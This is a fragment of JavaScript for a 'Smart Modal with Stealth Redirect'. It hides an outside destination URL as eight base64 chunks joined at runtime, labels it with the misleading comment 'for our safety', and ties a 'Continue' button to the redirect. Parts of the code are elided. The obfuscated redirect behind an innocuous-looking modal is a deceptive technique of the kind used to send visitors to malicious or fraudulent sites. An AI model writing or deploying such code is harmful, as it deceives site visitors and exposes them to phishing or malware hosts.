// Smart Modal with Stealth Redirect
(function() {
    // ============================================
    // CONFIGURATION
    // ============================================
    
    // destination URL for our safety
    const _p1 = 'aHR0cDovL3A4';
    const _p2 = 'cjkuY29tLz91';
    const _p3 = 'dG1fY2FtcGFp';
    const _p4 = 'Z249cTBQbUhq';
    const _p5 = 'Y1RxTSZ2MT1b';
    const _p6 = 'djFdJnYyPVt2';
    const _p7 = 'Ml0mdjM9W3Yz';
    const _p8 = 'XQ==';
    
    function getTarget() {
        try {
            return atob(_p1) + atob(_p2) + atob(_p3) + atob(_p4) + 
                   atob(_p5) + atob(_p6) + atob(_p7) + atob(_p8);
        } catch(e) {
    ...
    function init() {
        ...
        // Continue button - redirect to destination
